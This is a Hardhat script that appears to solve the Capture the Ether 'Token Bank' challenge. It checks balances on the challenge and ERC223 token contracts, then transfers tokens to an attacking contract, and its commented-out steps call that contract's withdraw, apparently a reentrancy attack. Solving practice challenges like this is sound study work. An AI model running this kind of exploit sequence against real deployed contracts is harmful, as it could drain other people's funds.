import { BigNumber } from "ethers";

const hre = require("hardhat");
const { ethers } = require("@nomiclabs/hardhat-ethers");
// here we bring in the ethers utils
const utils = hre.ethers.utils

async function main() {

    // initiate challenge contract and check balance
    const TokenBankChallenge = await hre.ethers.getContractFactory("TokenBankChallenge");
    const tokenBankChallenge = await TokenBankChallenge.attach("0x60E4775C81955c2Ce9F63F202EF70e4328A55f2D");
    const tx = await tokenBankChallenge.balanceOf('0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee');
    const my_tx = await tokenBankChallenge.balanceOf('0xF65426fFE174E0F636A8F739d7a2196D9A44Eda9');
    console.log('token bank chal balance of challenge creator: ', await tx.toString());
    console.log('my balance of challenge creator: ', await my_tx.toString());

    // erc223 token
    const Token223 = await hre.ethers.getContractFactory("SimpleERC223Token");
    const token223 = await Token223.attach("0x0de2404718b1C83e2D55d1B5763F5029C693edE7");
    const tokentx = await token223.balanceOf('0x60E4775C81955c2Ce9F63F202EF70e4328A55f2D');
    console.log('token balance of chalenge contract: ', await tokentx.toString());

    // // init attack contract with challenge addr
    // const TokenBankAttack = await hre.ethers.getContractFactory("callWithdraw");
    // const tokenBankAttack = await TokenBankAttack.attach("0x7B3865D32C83E5f16545c9F6b6d87533c97A7C6A");
    // const attackinit = await tokenBankAttack.initCodeToCall(tokenBankChallenge.address);

    // transfer tokens to our attacking contract
    const transfer = await token223.transfer('0x7B3865D32C83E5f16545c9F6b6d87533c97A7C6A', BigNumber.from('500000000000000000000000'));
    console.log('transfer: ', transfer.tx); // tx hash

    // // call withdraw
    // const withdraw = await tokenBankAttack.callWithdraw();
    // console.log('transfer: ', await withdraw.tx); // tx hash

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });